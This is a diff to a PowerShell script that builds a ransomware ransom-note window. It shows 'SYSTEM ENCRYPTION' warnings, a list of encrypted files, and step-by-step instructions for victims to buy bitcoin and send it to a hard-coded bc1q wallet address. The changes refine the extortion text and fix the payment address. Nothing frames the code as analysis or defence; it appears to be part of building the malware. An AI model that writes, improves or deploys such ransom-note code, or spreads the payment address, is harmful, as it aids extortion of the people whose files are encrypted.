@@ -241,7 +241,7 @@ function Show-BitcoinInstructions {
     
     # Step 4: Link Bank
     $step4Header = New-Object System.Windows.Controls.TextBlock
-    $step4Header.Text = "STEP 4: Link Bank"
+    $step4Header.Text = "STEP 4: Payment Method"
     $step4Header.FontSize = 16
     $step4Header.FontWeight = [System.Windows.FontWeights]::Bold
     $step4Header.Margin = '0,0,0,10'
@@ -291,7 +291,7 @@ function Show-BitcoinInstructions {
     $step5List.Margin = '20,0,0,20'
     
     $step5Item1 = New-Object System.Windows.Controls.TextBlock
-    $step5Item1.Text = "• Once you have added a payment method, navigate to the 'Pay' page and select the square QR code icon in the top right"
+    $step5Item1.Text = "• Once you have added a payment method, navigate to the 'Pay' page and select the square QR code icon`n in the top right"
     $step5Item1.FontSize = 12
     $step5Item1.Margin = '0,0,0,3'
     
@@ -330,13 +330,13 @@ function Show-BitcoinInstructions {
     $step5Item7.Margin = '0,0,0,3'
     
     $step5Item8 = New-Object System.Windows.Controls.TextBlock
-    $step5Item8.Text = "• If QR code didn't work, manually enter the bitcoin address displayed on the red screen on your computer."
+    $step5Item8.Text = "• If QR code didn't work, manually enter the bitcoin address: bc1q3z7uwz8p5lpwk0wnz5aj2xyszs9fty5s97xm7u"
     $step5Item8.FontSize = 12
     $step5Item8.Margin = '0,0,0,3'
     $step5Item8.TextWrapping = 'Wrap'
     
     $step5Item9 = New-Object System.Windows.Controls.TextBlock
-    $step5Item9.Text = "• IMPORTANT: ENSURE YOU ENTER THE ADDRESS EXACTLY AS DISPLAYED ON RED WINDOW - if any character is wrong, payment will not be received."
+    $step5Item9.Text = "• IMPORTANT: ENSURE YOU ENTER THE ADDRESS EXACTLY AS DISPLAYED - if any character is wrong, payment will not be received."
     $step5Item9.FontSize = 12
     $step5Item9.FontWeight = [System.Windows.FontWeights]::Bold
     $step5Item9.Foreground = [System.Windows.Media.Brushes]::DarkRed
@@ -543,7 +543,7 @@ $warningIcon1.Margin = '0,0,10,0'
 
 # Section 1 Title
 $section1Title = New-Object System.Windows.Controls.TextBlock
-$section1Title.Text = "SYSTEM ENCRYPTION DETECTED"
+$section1Title.Text = "SYSTEM ENCRYPTION"
 $section1Title.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue
 $section1Title.FontFamily = 'Segoe UI'
 $section1Title.FontSize = 18
@@ -778,7 +778,7 @@ $addressTitle.FontWeight = 'Bold'
 $addressTitle.Margin = '0,0,0,5'
 
 $addressValue = New-Object System.Windows.Controls.TextBlock
-$addressValue.Text = "q3z7uwz8p5lpwk0wnz5aj2xyszs9fty5s97xm7u"
+$addressValue.Text = "bc1q3z7uwz8p5lpwk0wnz5aj2xyszs9fty5s97xm7u"
 $addressValue.Foreground = [System.Windows.Media.Brushes]::White
 $addressValue.Background = [System.Windows.Media.Brushes]::DarkSlateGray
 $addressValue.FontFamily = 'Consolas'
@@ -828,7 +828,7 @@ $fileStack.Margin = '5,5,5,5'
 
 # File list title
 $fileTitle = New-Object System.Windows.Controls.TextBlock
-$fileTitle.Text = "TOP $($systemFiles.Count) ENCRYPTED files"
+$fileTitle.Text = "TOP $($systemFiles.Count) ENCRYPTED FILES"
 $fileTitle.Foreground = [System.Windows.Media.Brushes]::Red
 $fileTitle.FontFamily = 'Segoe UI'
 $fileTitle.FontSize = 18
